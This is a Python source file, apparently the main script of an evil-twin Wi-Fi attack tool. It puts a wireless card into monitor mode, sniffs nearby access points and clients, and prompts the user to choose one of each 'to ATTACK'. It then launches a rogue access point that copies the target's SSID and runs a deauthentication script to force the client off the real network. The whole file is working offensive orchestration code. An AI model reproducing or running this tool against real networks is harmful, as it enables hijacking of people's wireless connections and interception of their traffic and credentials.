import tools
from pretty_print import pretty
from FakeAP import FakeAP, reset_network_settings
import sniff_ap as sniffAP
import sniff_clients as sniffCL
import mode

import os
import sys
import time


# def handler(signum, frame):
#     if signum == signal.SIGINT or signum == signal.SIGSTOP:
#         tools.reset_network_settings()
#         exit(1)  # User stopped the process


if __name__ == '__main__':
    
    

    os.system("clear")
    pretty("Evil-Twin Process has STARTED...")
    # signal.signal(signal.SIGINT, handler=handler)
    # signal.signal(signal.SIGSTOP, handler=handler)
    interface = None
    if len(sys.argv) > 2:
        print("Usage: sudo python3 EvilTwin.py <interface_name>")

    elif len(sys.argv) > 1:
        if sys.argv[1] in tools.nics_from_ifconfig():
            interface = sys.argv[1]
        else:
            print(f'No such NIC: {sys.argv[1]}')

    if interface is None:
        interface = tools.choose_interface('No Network interface card was given...')

    # time.sleep(2)
    # Use airmon-ng to kill processes interfering with our network performance
    os.system("sudo airmon-ng check kill")
    # time.sleep(2)
    mode.monitor(interface)

    time.sleep(2)
    # Sniffing Access Points..
    sniffAP.start(interface)
    # os.system(f'python3 sniff_ap.py {interface}')
    # os.system(f'gnome-terminal -- sh -c "python3 sniff_ap.py {interface}"')
    # input("Waiting for some AP's to be discovered...")
    
    print("    \n\n\n    ")
    for i in range(len(sniffAP.AP_LIST)):
        print("index [{0}] -> {1}".format(i, sniffAP.AP_LIST[i]))

    # time.sleep(0.5)
    # Choosing 1 of the AP as A Victim
    index = int(input(" Choose an Access Point to ATTACK -   "))
    mac_ap = sniffAP.AP_LIST[index][1]
    channel = sniffAP.AP_LIST[index][2]
    ssid = sniffAP.AP_LIST[index][0]

    time.sleep(3)
    # Sniffing Clients connecting to the Chosen AP
    sniffCL.start(interface, mac_ap, channel)
    for i in range(len(sniffCL.CL_LIST)):
        print("index [{0}] -> {1}".format(i, sniffCL.CL_LIST[i]))

    # Choosing 1 of the Clients as A Victim
    print(" When choosing a client the attack will start immediately ")
    index = int(input(" Choose an Client to ATTACK -   "))
    client_mac = sniffCL.CL_LIST[index]
    time.sleep(1)
    
    
    os.system("clear")
    print("Choose interface to act as a Fack Access Point")
    print("Once you chose the inteface the attack will initiate....")
    print("DONT CHOOSE THE SAME INTERFACE IN THE START !!! ")
    
    interface2 = tools.choose_interface()
    os.system(f'gnome-terminal -- sh -c "python3 rogue_ap_attack.py {interface2} {ssid}" ')
    # Disconnect the client from the AP
    os.system("python3 deauth.py " + client_mac + " " + mac_ap + " " + interface)
    

    mode.manage(interface)
